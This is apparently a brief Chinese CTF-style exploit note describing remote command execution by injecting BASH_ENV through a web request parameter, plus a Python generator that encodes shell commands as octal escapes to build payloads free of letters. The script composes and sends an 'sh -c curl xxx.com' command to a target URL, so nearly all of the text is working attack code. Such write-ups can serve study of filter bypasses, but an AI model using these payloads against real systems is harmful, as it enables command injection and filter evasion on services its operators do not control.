# 思路
	- 使用进行RCE, 并使用构造无字母payload
- # RCE
	- 参考： ((64bbf5e5-6ddf-4ff6-9d7f-ba6bc9d95262))
	- ```shell
	  BASH_ENV='$(id 1>&2)' bash -c 'echo hello'
	  ```
	- 其中构造的RCE payload中不能再重复使用bash, 否则会导致无限fork
- # 无字母payload构造
	- ```python
	  
	  def zero_str():
	      return "$0"
	  
	  def num(n: int):
	      return str(n)
	  
	  def string(s: str):
	      return "$'" + "".join(
	          ["\\" + num(int(oct(ord(c))[2:]))
	              for c in s]
	      ) + "'"
	  
	  def payload(cmd):
	      return "{zero}<<<{zero}\\<\\<\\<{cmd}".format(
	          zero = zero_str(),
	          cmd = string(cmd)
	      )
	  
	  # url = "http://127.0.0.1:80"
	  payload = "{cmd} {arg1} {arg2}".format(
	      cmd=string("sh"), # 此处不能使用bash
	      arg1=string("-c"),
	      arg2=string("curl xxx.com") # 此处不能使用bash
	  )
	  r = base_get(url + "?env[BASH_ENV]=" + enc_dec.urlencode("$(CMD 1>&2)".replace("CMD", payload)))
	  print(r.text.rpartition("</code>")[2])
	  ```